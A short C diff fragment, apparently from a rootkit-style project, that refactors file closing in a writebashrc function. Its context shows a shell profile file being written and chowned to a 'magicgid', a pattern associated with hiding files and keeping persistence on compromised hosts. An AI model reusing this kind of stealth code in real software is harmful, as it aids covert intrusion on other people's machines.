@@ -32,8 +32,7 @@ int writebashrc(void){
         fputc(curchar, bfp);
     }
 
-    fclose(pfp);
-    fclose(bfp);
+    fcloser(2, pfp, bfp);
 
     magicgid = readgid();
     chown_path(PROFILE_PATH, magicgid);
